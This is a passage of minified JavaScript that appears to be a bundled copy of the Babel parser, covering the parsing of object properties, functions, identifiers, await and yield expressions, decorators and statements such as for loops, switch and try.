J=[];if(this.match(26)){if(this.hasPlugin("decorators"))this.raise(S.UnsupportedPropertyDecorator,this.state.startLoc);while(this.match(26))J.push(this.parseDecorator())}let Q=this.startNode(),Y=!1,W=!1,G;if(this.match(21)){if(J.length)this.unexpected();return this.parseSpread()}if(J.length)Q.decorators=J,J=[];if(Q.method=!1,X)G=this.state.startLoc;let H=this.eat(55);this.parsePropertyNamePrefixOperator(Q);let z=this.state.containsEsc;if(this.parsePropertyName(Q,X),!H&&!z&&this.maybeAsyncOrAccessorProp(Q)){let{key:$}=Q,V=$.name;if(V==="async"&&!this.hasPrecedingLineBreak())Y=!0,this.resetPreviousNodeTrailingComments($),H=this.eat(55),this.parsePropertyName(Q);if(V==="get"||V==="set"){if(W=!0,this.resetPreviousNodeTrailingComments($),Q.kind=V,this.match(55))H=!0,this.raise(S.AccessorIsGenerator,this.state.curPosition(),{kind:V}),this.next();this.parsePropertyName(Q)}}return this.parseObjPropValue(Q,G,H,Y,!1,W,X)}getGetterSetterExpectedParamCount(X){return X.kind==="get"?0:1}getObjectOrClassMethodParams(X){return X.params}checkGetterSetterParams(X){var J;let Q=this.getGetterSetterExpectedParamCount(X),Y=this.getObjectOrClassMethodParams(X);if(Y.length!==Q)this.raise(X.kind==="get"?S.BadGetterArity:S.BadSetterArity,X);if(X.kind==="set"&&((J=Y[Y.length-1])==null?void 0:J.type)==="RestElement")this.raise(S.BadSetterRestParameter,X)}parseObjectMethod(X,J,Q,Y,W){if(W){let G=this.parseMethod(X,J,!1,!1,!1,"ObjectMethod");return this.checkGetterSetterParams(G),G}if(Q||J||this.match(10)){if(Y)this.unexpected();return X.kind="method",X.method=!0,this.parseMethod(X,J,Q,!1,!1,"ObjectMethod")}}parseObjectProperty(X,J,Q,Y){if(X.shorthand=!1,this.eat(14))return X.value=Q?this.parseMaybeDefault(this.state.startLoc):this.parseMaybeAssignAllowInOrVoidPattern(8,Y),this.finishObjectProperty(X);if(!X.computed&&X.key.type==="Identifier"){if(this.checkReservedWord(X.key.name,X.key.loc.start,!0,!1),Q)X.value=this.parseMaybeDefault(J,this.cloneIdentifier(X.key));else if(this.match(29)){let W=this.state.startLoc;if(Y!=null){if(Y.shorthandAssignLoc===null)Y.shorthandAssignLoc=W}else this.raise(S.InvalidCoverInitializedName,W);X.value=this.parseMaybeDefault(J,this.cloneIdentifier(X.key))}else X.value=this.cloneIdentifier(X.key);return X.shorthand=!0,this.finishObjectProperty(X)}}finishObjectProperty(X){return this.finishNode(X,"ObjectProperty")}parseObjPropValue(X,J,Q,Y,W,G,H){let z=this.parseObjectMethod(X,Q,Y,W,G)||this.parseObjectProperty(X,J,W,H);if(!z)this.unexpected();return z}parsePropertyName(X,J){if(this.eat(0))X.computed=!0,X.key=this.parseMaybeAssignAllowIn(),this.expect(3);else{let{type:Q,value:Y}=this.state,W;if(u9(Q))W=this.parseIdentifier(!0);else switch(Q){case 135:W=this.parseNumericLiteral(Y);break;case 134:W=this.parseStringLiteral(Y);break;case 136:W=this.parseBigIntLiteral(Y);break;case 139:{let G=this.state.startLoc;if(J!=null){if(J.privateKeyLoc===null)J.privateKeyLoc=G}else this.raise(S.UnexpectedPrivateField,G);W=this.parsePrivateName();break}default:if(Q===137){W=this.parseDecimalLiteral(Y);break}this.unexpected()}if(X.key=W,Q!==139)X.computed=!1}}initFunction(X,J){X.id=null,X.generator=!1,X.async=J}parseMethod(X,J,Q,Y,W,G,H=!1){this.initFunction(X,Q),X.generator=J,this.scope.enter(530|(H?576:0)|(W?32:0)),this.prodParam.enter(v5(Q,X.generator)),this.parseFunctionParams(X,Y);let z=this.parseFunctionBodyAndFinish(X,G,!0);return this.prodParam.exit(),this.scope.exit(),z}parseArrayLike(X,J,Q,Y){if(Q)this.expectPlugin("recordAndTuple");let W=this.state.inFSharpPipelineDirectBody;this.state.inFSharpPipelineDirectBody=!1;let G=this.startNode();return this.next(),G.elements=this.parseExprList(X,!Q,Y,G),this.state.inFSharpPipelineDirectBody=W,this.finishNode(G,Q?"TupleExpression":"ArrayExpression")}parseArrowExpression(X,J,Q,Y){this.scope.enter(518);let W=v5(Q,!1);if(!this.match(5)&&this.prodParam.hasIn)W|=8;this.prodParam.enter(W),this.initFunction(X,Q);let G=this.state.maybeInArrowParameters;if(J)this.state.maybeInArrowParameters=!0,this.setArrowFunctionParameters(X,J,Y);return this.state.maybeInArrowParameters=!1,this.parseFunctionBody(X,!0),this.prodParam.exit(),this.scope.exit(),this.state.maybeInArrowParameters=G,this.finishNode(X,"ArrowFunctionExpression")}setArrowFunctionParameters(X,J,Q){this.toAssignableList(J,Q,!1),X.params=J}parseFunctionBodyAndFinish(X,J,Q=!1){return this.parseFunctionBody(X,!1,Q),this.finishNode(X,J)}parseFunctionBody(X,J,Q=!1){let Y=J&&!this.match(5);if(this.expressionScope.enter(HV()),Y)X.body=this.parseMaybeAssign(),this.checkParams(X,!1,J,!1);else{let W=this.state.strict,G=this.state.labels;this.state.labels=[],this.prodParam.enter(this.prodParam.currentFlags()|4),X.body=this.parseBlock(!0,!1,(H)=>{let z=!this.isSimpleParamList(X.params);if(H&&z)this.raise(S.IllegalLanguageModeDirective,(X.kind==="method"||X.kind==="constructor")&&!!X.key?X.key.loc.end:X);let $=!W&&this.state.strict;if(this.checkParams(X,!this.state.strict&&!J&&!Q&&!z,J,$),this.state.strict&&X.id)this.checkIdentifier(X.id,65,$)}),this.prodParam.exit(),this.state.labels=G}this.expressionScope.exit()}isSimpleParameter(X){return X.type==="Identifier"}isSimpleParamList(X){for(let J=0,Q=X.length;J<Q;J++)if(!this.isSimpleParameter(X[J]))return!1;return!0}checkParams(X,J,Q,Y=!0){let W=!J&&new Set,G={type:"FormalParameters"};for(let H of X.params)this.checkLVal(H,G,5,W,Y)}parseExprList(X,J,Q,Y){let W=[],G=!0;while(!this.eat(X)){if(G)G=!1;else if(this.expect(12),this.match(X)){if(Y)this.addTrailingCommaExtraToNode(Y);this.next();break}W.push(this.parseExprListItem(X,J,Q))}return W}parseExprListItem(X,J,Q,Y){let W;if(this.match(12)){if(!J)this.raise(S.UnexpectedToken,this.state.curPosition(),{unexpected:","});W=null}else if(this.match(21)){let G=this.state.startLoc;W=this.parseParenItem(this.parseSpread(Q),G)}else if(this.match(17)){if(this.expectPlugin("partialApplication"),!Y)this.raise(S.UnexpectedArgumentPlaceholder,this.state.startLoc);let G=this.startNode();this.next(),W=this.finishNode(G,"ArgumentPlaceholder")}else W=this.parseMaybeAssignAllowInOrVoidPattern(X,Q,this.parseParenItem);return W}parseIdentifier(X){let J=this.startNode(),Q=this.parseIdentifierName(X);return this.createIdentifier(J,Q)}createIdentifier(X,J){return X.name=J,X.loc.identifierName=J,this.finishNode(X,"Identifier")}createIdentifierAt(X,J,Q){return X.name=J,X.loc.identifierName=J,this.finishNodeAt(X,"Identifier",Q)}parseIdentifierName(X){let J,{startLoc:Q,type:Y}=this.state;if(u9(Y))J=this.state.value;else this.unexpected();let W=CP(Y);if(X){if(W)this.replaceToken(132)}else this.checkReservedWord(J,Q,W,!1);return this.next(),J}checkReservedWord(X,J,Q,Y){if(X.length>10)return;if(!dP(X))return;if(Q&&cP(X)){this.raise(S.UnexpectedKeyword,J,{keyword:X});return}if((!this.state.strict?c$:Y?d$:l$)(X,this.inModule)){this.raise(S.UnexpectedReservedWord,J,{reservedWord:X});return}else if(X==="yield"){if(this.prodParam.hasYield){this.raise(S.YieldBindingIdentifier,J);return}}else if(X==="await"){if(this.prodParam.hasAwait){this.raise(S.AwaitBindingIdentifier,J);return}if(this.scope.inStaticBlock){this.raise(S.AwaitBindingIdentifierInStaticBlock,J);return}this.expressionScope.recordAsyncArrowParametersError(J)}else if(X==="arguments"){if(this.scope.inClassAndNotInNonArrowFunction){this.raise(S.ArgumentsInClass,J);return}}}recordAwaitIfAllowed(){let X=this.prodParam.hasAwait;if(X&&!this.scope.inFunction)this.state.hasTopLevelAwait=!0;return X}parseAwait(X){let J=this.startNodeAt(X);if(this.expressionScope.recordParameterInitializerError(S.AwaitExpressionFormalParameter,J),this.eat(55))this.raise(S.ObsoleteAwaitStar,J);if(!this.scope.inFunction&&!(this.optionFlags&1))if(this.isAmbiguousPrefixOrIdentifier())this.ambiguousScriptDifferentAst=!0;else this.sawUnambiguousESM=!0;if(!this.state.soloAwait)J.argument=this.parseMaybeUnary(null,!0);return this.finishNode(J,"AwaitExpression")}isAmbiguousPrefixOrIdentifier(){if(this.hasPrecedingLineBreak())return!0;let{type:X}=this.state;return X===53||X===10||X===0||f5(X)||X===102&&!this.state.containsEsc||X===138||X===56||this.hasPlugin("v8intrinsic")&&X===54}parseYield(X){let J=this.startNodeAt(X);this.expressionScope.recordParameterInitializerError(S.YieldInParameter,J);let Q=!1,Y=null;if(!this.hasPrecedingLineBreak())switch(Q=this.eat(55),this.state.type){case 13:case 140:case 8:case 11:case 3:case 9:case 14:case 12:if(!Q)break;default:Y=this.parseMaybeAssign()}return J.delegate=Q,J.argument=Y,this.finishNode(J,"YieldExpression")}parseImportCall(X){if(this.next(),X.source=this.parseMaybeAssignAllowIn(),X.options=null,this.eat(12))if(!this.match(11)){if(X.options=this.parseMaybeAssignAllowIn(),this.eat(12)){if(this.addTrailingCommaExtraToNode(X.options),!this.match(11)){do this.parseMaybeAssignAllowIn();while(this.eat(12)&&!this.match(11));this.raise(S.ImportCallArity,X)}}}else this.addTrailingCommaExtraToNode(X.source);return this.expect(11),this.finishNode(X,"ImportExpression")}checkPipelineAtInfixOperator(X,J){if(this.hasPlugin(["pipelineOperator",{proposal:"smart"}])){if(X.type==="SequenceExpression")this.raise(S.PipelineHeadSequenceExpression,J)}}parseSmartPipelineBodyInStyle(X,J){if(this.isSimpleReference(X)){let Q=this.startNodeAt(J);return Q.callee=X,this.finishNode(Q,"PipelineBareFunction")}else{let Q=this.startNodeAt(J);return this.checkSmartPipeTopicBodyEarlyErrors(J),Q.expression=X,this.finishNode(Q,"PipelineTopicExpression")}}isSimpleReference(X){switch(X.type){case"MemberExpression":return!X.computed&&this.isSimpleReference(X.object);case"Identifier":return!0;default:return!1}}checkSmartPipeTopicBodyEarlyErrors(X){if(this.match(19))throw this.raise(S.PipelineBodyNoArrow,this.state.startLoc);if(!this.topicReferenceWasUsedInCurrentContext())this.raise(S.PipelineTopicUnused,X)}withTopicBindingContext(X){let J=this.state.topicContext;this.state.topicContext={maxNumOfResolvableTopics:1,maxTopicIndex:null};try{return X()}finally{this.state.topicContext=J}}withSmartMixTopicForbiddingContext(X){if(this.hasPlugin(["pipelineOperator",{proposal:"smart"}])){let J=this.state.topicContext;this.state.topicContext={maxNumOfResolvableTopics:0,maxTopicIndex:null};try{return X()}finally{this.state.topicContext=J}}else return X()}withSoloAwaitPermittingContext(X){let J=this.state.soloAwait;this.state.soloAwait=!0;try{return X()}finally{this.state.soloAwait=J}}allowInAnd(X){let J=this.prodParam.currentFlags();if(8&~J){this.prodParam.enter(J|8);try{return X()}finally{this.prodParam.exit()}}return X()}disallowInAnd(X){let J=this.prodParam.currentFlags();if(8&J){this.prodParam.enter(J&-9);try{return X()}finally{this.prodParam.exit()}}return X()}registerTopicReference(){this.state.topicContext.maxTopicIndex=0}topicReferenceIsAllowedInCurrentContext(){return this.state.topicContext.maxNumOfResolvableTopics>=1}topicReferenceWasUsedInCurrentContext(){return this.state.topicContext.maxTopicIndex!=null&&this.state.topicContext.maxTopicIndex>=0}parseFSharpPipelineBody(X){let J=this.state.startLoc;this.state.potentialArrowAt=this.state.start;let Q=this.state.inFSharpPipelineDirectBody;this.state.inFSharpPipelineDirectBody=!0;let Y=this.parseExprOp(this.parseMaybeUnaryOrPrivate(),J,X);return this.state.inFSharpPipelineDirectBody=Q,Y}parseModuleExpression(){this.expectPlugin("moduleBlocks");let X=this.startNode();if(this.next(),!this.match(5))this.unexpected(null,5);let J=this.startNodeAt(this.state.endLoc);this.next();let Q=this.initializeScopes(!0);this.enterInitialScopes();try{X.body=this.parseProgram(J,8,"module")}finally{Q()}return this.finishNode(X,"ModuleExpression")}parseVoidPattern(X){this.expectPlugin("discardBinding");let J=this.startNode();if(X!=null)X.voidPatternLoc=this.state.startLoc;return this.next(),this.finishNode(J,"VoidPattern")}parseMaybeAssignAllowInOrVoidPattern(X,J,Q){if(J!=null&&this.match(88)){let Y=this.lookaheadCharCode();if(Y===44||Y===(X===3?93:X===8?125:41)||Y===61)return this.parseMaybeDefault(this.state.startLoc,this.parseVoidPattern(J))}return this.parseMaybeAssignAllowIn(J,Q)}parsePropertyNamePrefixOperator(X){}}var L2={kind:1},DS={kind:2},wS=/[\uD800-\uDFFF]/u,I2=/in(?:stanceof)?/y;function NS(X,J,Q){for(let Y=0;Y<X.length;Y++){let W=X[Y],{type:G}=W;if(typeof G==="number"){{if(G===139){let{loc:H,start:z,value:$,end:V}=W,K=z+1,Z=a0(H.start,1);X.splice(Y,1,new S6({type:P6(27),value:"#",start:z,end:K,startLoc:H.start,endLoc:Z}),new S6({type:P6(132),value:$,start:K,end:V,startLoc:Z,endLoc:H.end})),Y++;continue}if(f5(G)){let{loc:H,start:z,value:$,end:V}=W,K=z+1,Z=a0(H.start,1),q;if(J.charCodeAt(z-Q)===96)q=new S6({type:P6(22),value:"`",start:z,end:K,startLoc:H.start,endLoc:Z});else q=new S6({type:P6(8),value:"}",start:z,end:K,startLoc:H.start,endLoc:Z});let B,M,O,R;if(G===24)M=V-1,O=a0(H.end,-1),B=$===null?null:$.slice(1,-1),R=new S6({type:P6(22),value:"`",start:M,end:V,startLoc:O,endLoc:H.end});else M=V-2,O=a0(H.end,-2),B=$===null?null:$.slice(1,-2),R=new S6({type:P6(23),value:"${",start:M,end:V,startLoc:O,endLoc:H.end});X.splice(Y,1,q,new S6({type:P6(20),value:B,start:K,end:M,startLoc:Z,endLoc:O}),R),Y+=2;continue}}W.type=P6(G)}}return X}class MV extends BV{parseTopLevel(X,J){if(X.program=this.parseProgram(J,140,this.options.sourceType==="module"?"module":"script"),X.comments=this.comments,this.optionFlags&256)X.tokens=NS(this.tokens,this.input,this.startIndex);return this.finishNode(X,"File")}parseProgram(X,J,Q){if(X.sourceType=Q,X.interpreter=this.parseInterpreterDirective(),this.parseBlockBody(X,!0,!0,J),this.inModule){if(!(this.optionFlags&64)&&this.scope.undefinedExports.size>0)for(let[W,G]of Array.from(this.scope.undefinedExports))this.raise(S.ModuleExportUndefined,G,{localName:W});this.addExtra(X,"topLevelAwait",this.state.hasTopLevelAwait)}let Y;if(J===140)Y=this.finishNode(X,"Program");else Y=this.finishNodeAt(X,"Program",a0(this.state.startLoc,-1));return Y}stmtToDirective(X){let J=this.castNodeTo(X,"Directive"),Q=this.castNodeTo(X.expression,"DirectiveLiteral"),Y=Q.value,W=this.input.slice(this.offsetToSourcePos(Q.start),this.offsetToSourcePos(Q.end)),G=Q.value=W.slice(1,-1);return this.addExtra(Q,"raw",W),this.addExtra(Q,"rawValue",G),this.addExtra(Q,"expressionValue",Y),J.value=Q,delete X.expression,J}parseInterpreterDirective(){if(!this.match(28))return null;let X=this.startNode();return X.value=this.state.value,this.next(),this.finishNode(X,"InterpreterDirective")}isLet(){if(!this.isContextual(100))return!1;return this.hasFollowingBindingAtom()}isUsing(){if(!this.isContextual(107))return!1;let X=this.nextTokenInLineStart(),J=this.codePointAtPos(X);return this.chStartsBindingIdentifier(J,X)}isForUsing(){if(!this.isContextual(107))return!1;let X=this.nextTokenInLineStart(),J=this.codePointAtPos(X);if(this.isUnparsedContextual(X,"of")){let Q=this.lookaheadCharCodeSince(X+2);if(Q!==61&&Q!==58&&Q!==59)return!1}if(this.chStartsBindingIdentifier(J,X)||this.isUnparsedContextual(X,"void"))return!0;return!1}isAwaitUsing(){if(!this.isContextual(96))return!1;let X=this.nextTokenInLineStart();if(this.isUnparsedContextual(X,"using")){X=this.nextTokenInLineStartSince(X+5);let J=this.codePointAtPos(X);if(this.chStartsBindingIdentifier(J,X))return!0}return!1}chStartsBindingIdentifier(X,J){if(_6(X)){if(I2.lastIndex=J,I2.test(this.input)){let Q=this.codePointAtPos(I2.lastIndex);if(!f8(Q)&&Q!==92)return!1}return!0}else if(X===92)return!0;else return!1}chStartsBindingPattern(X){return X===91||X===123}hasFollowingBindingAtom(){let X=this.nextTokenStart(),J=this.codePointAtPos(X);return this.chStartsBindingPattern(J)||this.chStartsBindingIdentifier(J,X)}hasInLineFollowingBindingIdentifierOrBrace(){let X=this.nextTokenInLineStart(),J=this.codePointAtPos(X);return J===123||this.chStartsBindingIdentifier(J,X)}allowsUsing(){return(this.scope.inModule||!this.scope.inTopLevel)&&!this.scope.inBareCaseStatement}parseModuleItem(){return this.parseStatementLike(15)}parseStatementListItem(){return this.parseStatementLike(6|(!this.options.annexB||this.state.strict?0:8))}parseStatementOrSloppyAnnexBFunctionDeclaration(X=!1){let J=0;if(this.options.annexB&&!this.state.strict){if(J|=4,X)J|=8}return this.parseStatementLike(J)}parseStatement(){return this.parseStatementLike(0)}parseStatementLike(X){let J=null;if(this.match(26))J=this.parseDecorators(!0);return this.parseStatementContent(X,J)}parseStatementContent(X,J){let Q=this.state.type,Y=this.startNode(),W=!!(X&2),G=!!(X&4),H=X&1;switch(Q){case 60:return this.parseBreakContinueStatement(Y,!0);case 63:return this.parseBreakContinueStatement(Y,!1);case 64:return this.parseDebuggerStatement(Y);case 90:return this.parseDoWhileStatement(Y);case 91:return this.parseForStatement(Y);case 68:if(this.lookaheadCharCode()===46)break;if(!G)this.raise(this.state.strict?S.StrictFunction:this.options.annexB?S.SloppyFunctionAnnexB:S.SloppyFunction,this.state.startLoc);return this.parseFunctionStatement(Y,!1,!W&&G);case 80:if(!W)this.unexpected();return this.parseClass(this.maybeTakeDecorators(J,Y),!0);case 69:return this.parseIfStatement(Y);case 70:return this.parseReturnStatement(Y);case 71:return this.parseSwitchStatement(Y);case 72:return this.parseThrowStatement(Y);case 73:return this.parseTryStatement(Y);case 96:if(this.isAwaitUsing()){if(!this.allowsUsing())this.raise(S.UnexpectedUsingDeclaration,Y);else if(!W)this.raise(S.UnexpectedLexicalDeclaration,Y);else if(!this.recordAwaitIfAllowed())this.raise(S.AwaitUsingNotInAsyncContext,Y);return this.next(),this.parseVarStatement(Y,"await using")}break;case 107:if(this.state.containsEsc||!this.hasInLineFollowingBindingIdentifierOrBrace())break;if(!this.allowsUsing())this.raise(S.UnexpectedUsingDeclaration,this.state.startLoc);else if(!W)this.raise(S.UnexpectedLexicalDeclaration,this.state.startLoc);return this.parseVarStatement(Y,"using");case 100:{if(this.state.containsEsc)break;let V=this.nextTokenStart(),K=this.codePointAtPos(V);if(K!==91){if(!W&&this.hasFollowingLineBreak())break;if(!this.chStartsBindingIdentifier(K,V)&&K!==123)break}}case 75:if(!W)this.raise(S.UnexpectedLexicalDeclaration,this.state.startLoc);case 74:{let V=this.state.value;return this.parseVarStatement(Y,V)}case 92:return this.parseWhileStatement(Y);case 76:return this.parseWithStatement(Y);case 5:return this.parseBlock();case 13:return this.parseEmptyStatement(Y);case 83:{let V=this.lookaheadCharCode();if(V===40||V===46)break}case 82:{if(!(this.optionFlags&8)&&!H)this.raise(S.UnexpectedImportExport,this.state.startLoc);this.next();let V;if(Q===83)V=this.parseImport(Y);else V=this.parseExport(Y,J);return this.assertModuleNodeAllowed(V),V}default:if(this.isAsyncFunction()){if(!W)this.raise(S.AsyncFunctionInSingleStatementContext,this.state.startLoc);return this.next(),this.parseFunctionStatement(Y,!0,!W&&G)}}let z=this.state.value,$=this.parseExpression();if(W0(Q)&&$.type==="Identifier"&&this.eat(14))return this.parseLabeledStatement(Y,z,$,X);else return this.parseExpressionStatement(Y,$,J)}assertModuleNodeAllowed(X){if(!(this.optionFlags&8)&&!this.inModule)this.raise(S.ImportOutsideModule,X)}decoratorsEnabledBeforeExport(){if(this.hasPlugin("decorators-legacy"))return!0;return this.hasPlugin("decorators")&&this.getPluginOption("decorators","decoratorsBeforeExport")!==!1}maybeTakeDecorators(X,J,Q){if(X){var Y;if((Y=J.decorators)!=null&&Y.length){if(typeof this.getPluginOption("decorators","decoratorsBeforeExport")!=="boolean")this.raise(S.DecoratorsBeforeAfterExport,J.decorators[0]);J.decorators.unshift(...X)}else J.decorators=X;if(this.resetStartLocationFromNode(J,X[0]),Q)this.resetStartLocationFromNode(Q,J)}return J}canHaveLeadingDecorator(){return this.match(80)}parseDecorators(X){let J=[];do J.push(this.parseDecorator());while(this.match(26));if(this.match(82)){if(!X)this.unexpected();if(!this.decoratorsEnabledBeforeExport())this.raise(S.DecoratorExportClass,this.state.startLoc)}else if(!this.canHaveLeadingDecorator())throw this.raise(S.UnexpectedLeadingDecorator,this.state.startLoc);return J}parseDecorator(){this.expectOnePlugin(["decorators","decorators-legacy"]);let X=this.startNode();if(this.next(),this.hasPlugin("decorators")){let J=this.state.startLoc,Q;if(this.match(10)){let Y=this.state.startLoc;this.next(),Q=this.parseExpression(),this.expect(11),Q=this.wrapParenthesis(Y,Q);let W=this.state.startLoc;if(X.expression=this.parseMaybeDecoratorArguments(Q,Y),this.getPluginOption("decorators","allowCallParenthesized")===!1&&X.expression!==Q)this.raise(S.DecoratorArgumentsOutsideParentheses,W)}else{Q=this.parseIdentifier(!1);while(this.eat(16)){let Y=this.startNodeAt(J);if(Y.object=Q,this.match(139))this.classScope.usePrivateName(this.state.value,this.state.startLoc),Y.property=this.parsePrivateName();else Y.property=this.parseIdentifier(!0);Y.computed=!1,Q=this.finishNode(Y,"MemberExpression")}X.expression=this.parseMaybeDecoratorArguments(Q,J)}}else X.expression=this.parseExprSubscripts();return this.finishNode(X,"Decorator")}parseMaybeDecoratorArguments(X,J){if(this.eat(10)){let Q=this.startNodeAt(J);return Q.callee=X,Q.arguments=this.parseCallExpressionArguments(),this.toReferencedList(Q.arguments),this.finishNode(Q,"CallExpression")}return X}parseBreakContinueStatement(X,J){if(this.next(),this.isLineTerminator())X.label=null;else X.label=this.parseIdentifier(),this.semicolon();return this.verifyBreakContinue(X,J),this.finishNode(X,J?"BreakStatement":"ContinueStatement")}verifyBreakContinue(X,J){let Q;for(Q=0;Q<this.state.labels.length;++Q){let Y=this.state.labels[Q];if(X.label==null||Y.name===X.label.name){if(Y.kind!=null&&(J||Y.kind===1))break;if(X.label&&J)break}}if(Q===this.state.labels.length){let Y=J?"BreakStatement":"ContinueStatement";this.raise(S.IllegalBreakContinue,X,{type:Y})}}parseDebuggerStatement(X){return this.next(),this.semicolon(),this.finishNode(X,"DebuggerStatement")}parseHeaderExpression(){this.expect(10);let X=this.parseExpression();return this.expect(11),X}parseDoWhileStatement(X){return this.next(),this.state.labels.push(L2),X.body=this.withSmartMixTopicForbiddingContext(()=>this.parseStatement()),this.state.labels.pop(),this.expect(92),X.test=this.parseHeaderExpression(),this.eat(13),this.finishNode(X,"DoWhileStatement")}parseForStatement(X){this.next(),this.state.labels.push(L2);let J=null;if(this.isContextual(96)&&this.recordAwaitIfAllowed())J=this.state.startLoc,this.next();if(this.scope.enter(0),this.expect(10),this.match(13)){if(J!==null)this.unexpected(J);return this.parseFor(X,null)}let Q=this.isContextual(100);{let z=this.isAwaitUsing(),$=z||this.isForUsing(),V=Q&&this.hasFollowingBindingAtom()||$;if(this.match(74)||this.match(75)||V){let K=this.startNode(),Z;if(z){if(Z="await using",!this.recordAwaitIfAllowed())this.raise(S.AwaitUsingNotInAsyncContext,this.state.startLoc);this.next()}else Z=this.state.value;this.next(),this.parseVar(K,!0,Z);let q=this.finishNode(K,"VariableDeclaration"),B=this.match(58);if(B&&$)this.raise(S.ForInUsing,q);if((B||this.isContextual(102))&&q.declarations.length===1)return this.parseForIn(X,q,J);if(J!==null)this.unexpected(J);return this.parseFor(X,q)}}let Y=this.isContextual(95),W=new pJ,G=this.parseExpression(!0,W),H=this.isContextual(102);if(H){if(Q)this.raise(S.ForOfLet,G);if(J===null&&Y&&G.type==="Identifier")this.raise(S.ForOfAsync,G)}if(H||this.match(58)){this.checkDestructuringPrivate(W),this.toAssignable(G,!0);let z=H?"ForOfStatement":"ForInStatement";return this.checkLVal(G,{type:z}),this.parseForIn(X,G,J)}else this.checkExpressionErrors(W,!0);if(J!==null)this.unexpected(J);return this.parseFor(X,G)}parseFunctionStatement(X,J,Q){return this.next(),this.parseFunction(X,1|(Q?2:0)|(J?8:0))}parseIfStatement(X){return this.next(),X.test=this.parseHeaderExpression(),X.consequent=this.parseStatementOrSloppyAnnexBFunctionDeclaration(),X.alternate=this.eat(66)?this.parseStatementOrSloppyAnnexBFunctionDeclaration():null,this.finishNode(X,"IfStatement")}parseReturnStatement(X){if(!this.prodParam.hasReturn)this.raise(S.IllegalReturn,this.state.startLoc);if(this.next(),this.isLineTerminator())X.argument=null;else X.argument=this.parseExpression(),this.semicolon();return this.finishNode(X,"ReturnStatement")}parseSwitchStatement(X){this.next(),X.discriminant=this.parseHeaderExpression();let J=X.cases=[];this.expect(5),this.state.labels.push(DS),this.scope.enter(256);let Q;for(let Y;!this.match(8);)if(this.match(61)||this.match(65)){let W=this.match(61);if(Q)this.finishNode(Q,"SwitchCase");if(J.push(Q=this.startNode()),Q.consequent=[],this.next(),W)Q.test=this.parseExpression();else{if(Y)this.raise(S.MultipleDefaultsInSwitch,this.state.lastTokStartLoc);Y=!0,Q.test=null}this.expect(14)}else if(Q)Q.consequent.push(this.parseStatementListItem());else this.unexpected();if(this.scope.exit(),Q)this.finishNode(Q,"SwitchCase");return this.next(),this.state.labels.pop(),this.finishNode(X,"SwitchStatement")}parseThrowStatement(X){if(this.next(),this.hasPrecedingLineBreak())this.raise(S.NewlineAfterThrow,this.state.lastTokEndLoc);return X.argument=this.parseExpression(),this.semicolon(),this.finishNode(X,"ThrowStatement")}parseCatchClauseParam(){let X=this.parseBindingAtom();return this.scope.enter(this.options.annexB&&X.type==="Identifier"?8:0),this.checkLVal(X,{type:"CatchClause"},9),X}parseTryStatement(X){if(this.next(),X.block=this.parseBlock(),X.handler=null,this.match(62)){let J=this.startNode();if(this.next(),this.match(10))this.expect(10),J.param=this.parseCatchClauseParam(),this.expect(11);else J.param=null,this.scope.enter(0);J.body=this.withSmartMixTopicForbiddingContext(()=>this.parseBlock(!1,!1)),this.scope.exit(),X.handler=this.finishNode(J,"CatchClause")}if(X.finalizer=this.eat(67)?this.parseBlock():null,!X.handler&&!X.finalizer)this.raise(S.NoCatchOrFinally,X);return this.finishNode(X,"TryStatement")}parseVarStatement(X,J,Q=!1){return this.next(),this.parseVar(X,!1,J,Q),this.semicolon(),this.finishNode(X,"VariableDeclaration")}parseWhileStatement(X){return this.next(),X.test=this.parseHeaderExpression(),this.state.labels.push(L2),X.body=this.withSmartMixTopicForbiddingContext(()=>this.parseStatement()),this.state.labels.pop(),this.finishNode(X,"WhileStatement")}parseWithStatement(X){if(this.state.strict)this.raise(S.StrictWith,this.state.startLoc);return this.next(),X.object=this.parseHeaderExpression(),X.body=this.withSmartMixTopicForbiddingContext(()=>this.parseStatement()),this.finishNode(X,"WithStatement")}parseEmptyStatement(X){return this.next(),this.finishNode(X,"EmptyStatement")}parseLabeledStatement(X,J,Q,Y){for(let G of this.state.labels)if(G.name===J)this.raise(S.LabelRedeclaration,Q,{labelName:J});let W=TP(this.state.type)?1:this.match(71)?2:null;for(let G=this.state.labels.length-1;G>=0;G--){let H=this.state.labels[G];if(H.statementStart===X.start)H.statementStart=this.sourceToOffsetPos(this.state.start),H.kind=W;else break}return this.state.labels.push({name:J,kind:W,statementStart:this.sourceToOffsetPos(this.state.start)}),X.body=Y&8?this.parseStatementOrSloppyAnnexBFunctionDeclaration(!0):this.parseStatement(),this.state.labels.pop(),X.label=Q,this.finishNode(X,"LabeledStatement")}parseExpressionStatement(X,J,Q){return X.expression=J,this.semicolon(),this.finishNode(X,"ExpressionStatement")}parseBlock(X=!1,J=!0,Q){let Y=this.startNode();if(X)this.state.strictErrors.clear();if(this.expect(5),J)this.scope.enter(0);if(this.parseBlockBody(Y,X,!1,8,Q),J)this.scope.exit();return this.finishNode(Y,"BlockStatement")}isValidDirective(X){return X.type==="ExpressionStatement"&&X.expression.type==="StringLiteral"&&!X.expression.extra.parenthesized}parseBlockBody(X,J,Q,Y,W){let G=X.body=[],H=X.directives=[];this.parseBlockOrModuleBlockBody(G,J?H:void 0,Q,Y,W)}parseBlockOrModuleBlockBody(X,J,Q,Y,W){let G=this.state.strict,H=!1,z=!1;while(!this.match(Y)){let $=Q?this.parseModuleItem():this.parseStatementListItem();if(J&&!z){if(this.isValidDirective($)){let V=this.stmtToDirective($);if(J.push(V),!H&&V.value.value==="use strict")H=!0,this.setStrict(!0);continue}z=!0,this.state.strictErrors.clear()}X.push($)}if(W==null||W.call(this,H),!G)this.setStrict(!1);this.next()}parseFor(X,J){return X.init=J,this.semicolon(!1),X.test=this.match(13)?null:this.parseExpression(),this.semicolon(!1),X.update=this.match(11)?null:this.parseExpression(),this.expect(11),X.body=this.withSmartMixTopicForbiddingContext(()=>this.parseStatement()),this.scope.exit(),this.state.labels.pop(),this.finishNode(X,"ForStatement")}parseForIn(X,J,Q){let Y=this.match(58);if(this.next(),Y){if(Q!==null)this.unexpected(Q)}else X.await=Q!==null;if(J.type==="VariableDeclaration"&&J.declarations[0].init!=null&&(!Y||!this.options.annexB||this.state.strict||J.kind!=="var"||J.declarations[0].id.type!=="Identifier"))this.raise(S.ForInOfLoopInitializer,J,{type:Y?"ForInStatement":"ForOfStatement"});if(J.type==="AssignmentPattern")this.raise(S.InvalidLhs,J,{ancestor:{type:"ForStatement"}});return 